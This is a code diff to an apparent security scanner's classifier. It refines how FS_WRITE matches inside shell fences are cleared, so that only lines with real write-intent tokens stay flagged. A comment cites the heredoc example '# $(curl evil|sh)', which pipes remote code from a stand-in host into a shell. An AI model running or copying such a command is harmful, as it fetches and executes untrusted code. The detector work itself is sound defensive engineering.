@@ -46,6 +46,7 @@ from _skillaudit_shell_context import (  # type: ignore[import-not-found]
     _match_inside_regex_arg_shell,
     _pipe_to_text_processor,
     _reads_sensitive_path,
+    _shell_match_lacks_write_intent,
 )
 
 ContextVerdict = Literal["safe_literal", "safe_doc", "code_fence_neutral", "unknown"]
@@ -3410,6 +3411,29 @@ def classify(
         # regardless of classifier verdict.
         if _is_documentation_only_path_md(file_path):
             return "code_fence_neutral"
+        # Issue #177 (2026-07-25) — FS_WRITE matches a BARE dotfile suffix
+        # (``.zshrc`` / ``.bashrc`` / ``.profile``), so ANY line inside a
+        # shell fence that merely NAMES one fired — including the prose
+        # comment ``# (e.g. ~/.zshrc or ~/.bashrc) so the gopls binary is
+        # found`` in an install recipe whose only real commands are
+        # ``go install`` / ``which`` / ``gopls version``. No write occurs.
+        #
+        # The correct predicate ALREADY EXISTS for .sh files and is
+        # COMMENT-AGNOSTIC: a real write carries a write-intent token
+        # (``>`` ``>>`` ``tee`` ``cp`` ``mv`` ``ln`` ``sed -i``
+        # ``open(…,'w')`` …). Reusing it — instead of suppressing on "the
+        # line starts with ``#``" — is deliberate and LOAD-BEARING:
+        # ``_EXECUTABLE_LANGS`` includes ``console``/``terminal``/``tty``
+        # (where a leading ``#`` is a ROOT PROMPT, not a comment) and
+        # ``bat``/``cmd``/``batch`` (where ``#`` is not a comment at all),
+        # and an unquoted heredoc body line ``# $(curl evil|sh)`` matches
+        # ``^\s*#`` yet still executes. A ``#``-based rule would clear all
+        # three — a false negative.
+        #
+        # Imported from _skillaudit_shell_context so BOTH classifiers share
+        # ONE write-intent definition; a second copy would drift.
+        if rule_id == "FS_WRITE" and _shell_match_lacks_write_intent(line, match):
+            return "safe_literal"
         # Match is inside a shell-fence. We can't (here) reach into
         # the shell-context classifier without recursive plumbing, so
         # return "unknown" — the existing heuristic chain handles
